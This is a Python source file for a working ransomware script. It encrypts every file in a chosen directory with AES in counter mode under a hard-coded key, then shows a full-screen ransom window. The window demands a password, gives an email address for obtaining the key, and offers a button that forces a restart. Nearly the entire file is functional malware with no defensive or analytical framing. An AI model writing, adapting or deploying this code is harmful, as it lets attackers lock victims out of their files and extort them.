import os
from Crypto.Cipher import AES
from Crypto.Util import Counter
from Crypto import Random
from tkinter import *

KEY = b'1111111111111111'
PASSWORD = '0774654930'

TARGET_DIR = r'/home/user/Desktop/new/'  

# TARGET_DIR = r'C:\Users\YourName\Desktop\new'

def encrypt_files(directory, key):
    for filename in os.listdir(directory):
        filepath = os.path.join(directory, filename)
        if os.path.isfile(filepath):
            with open(filepath, 'rb') as f:
                plaintext = f.read()
            nonce = Random.get_random_bytes(8)
            ctr = Counter.new(64, prefix=nonce)
            cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
            ciphertext = nonce + cipher.encrypt(plaintext)
            with open(filepath, 'wb') as f:
                f.write(ciphertext)
    print("Encryption complete.")

def decrypt_files(directory, key):
    for filename in os.listdir(directory):
        filepath = os.path.join(directory, filename)
        if os.path.isfile(filepath):
            with open(filepath, 'rb') as f:
                data = f.read()
            nonce = data[:8]
            ciphertext = data[8:]
            ctr = Counter.new(64, prefix=nonce)
            cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
            plaintext = cipher.decrypt(ciphertext)
            with open(filepath, 'wb') as f:
                f.write(plaintext)
    print("Decryption complete.")

def restart_computer():
   
    os.system("shutdown /r /t 0")

def show_ransom_screen():
    def check_code():
        if entry.get().strip() == PASSWORD:
            status_label.config(text="✔️ Decryption will begin shortly", fg="green")
            root.update()
            decrypt_files(TARGET_DIR, KEY)
            root.destroy()
        else:
            status_label.config(text="❌ Incorrect password", fg="red")

    root = Tk()
    root.attributes('-fullscreen', True)
    root.configure(bg="black")

    label = Label(root, text="🛑 Enter the password to decrypt the files or connetact us from toxi.tik.19@gmail.com to give you the Key", font=("Courier", 24), fg="red", bg="black")
    label.pack(pady=100)

    entry = Entry(root, font=("Courier", 20), show='*', justify='center')
    entry.pack(pady=20)

    btn = Button(root, text="ENTER", font=("Courier", 18), command=check_code)
    btn.pack()

    btn2 = Button(root, text="Restart Computer", font=("Courier", 18), command=restart_computer)
    btn2.pack(pady=10)

    status_label = Label(root, text="", font=("Courier", 16), bg="black")
    status_label.pack(pady=20)

    root.mainloop()

encrypt_files(TARGET_DIR, KEY)
show_ransom_screen()

